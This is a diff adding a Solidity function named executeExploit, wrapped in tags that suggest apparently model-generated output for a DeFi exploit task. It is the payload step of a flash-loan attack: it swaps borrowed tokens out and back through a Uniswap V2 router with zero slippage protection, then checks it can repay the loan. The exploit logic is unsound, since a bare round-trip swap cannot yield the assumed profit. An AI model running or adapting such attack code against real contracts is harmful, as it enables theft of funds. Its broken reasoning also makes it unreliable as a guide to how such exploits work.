@@ -1,0 +1,41 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // 1. Sell a portion of the valuable token for another token (base token)
+    uint256 amountIn = amount / 10; // Use 10% of the loan amount for the initial sell
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = token0; // Assuming token0 is a beneficial swap
+
+    IUniswapV2Router(uniswapRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amountIn,
+        0, // Slippage not considered for this test
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // 2. Assuming we obtained token0, we can swap it back to valuableToken (base) using a different mechanism to configure greater profit.
+    uint256 token0Amount = IERC20(token0).balanceOf(address(this));
+    IERC20(token0).approve(address(uniswapRouter), token0Amount);
+    
+    path[0] = token0;
+    path[1] = address(valuableToken); // Back to our original token
+
+    IUniswapV2Router(uniswapRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        token0Amount,
+        0, // Slippage not considered for this test
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // 3. Gathering profits and preparing for loan repayment
+    uint256 totalValuableBalance = valuableToken.balanceOf(address(this));
+    console.log("Total valuable balance after swaps: ", totalValuableBalance);
+
+    // 4. Make sure to have enough to repay:
+    require(totalValuableBalance > amount, "Insufficient funds to repay flashloan");
+}
+</executeExploitCode>
+```
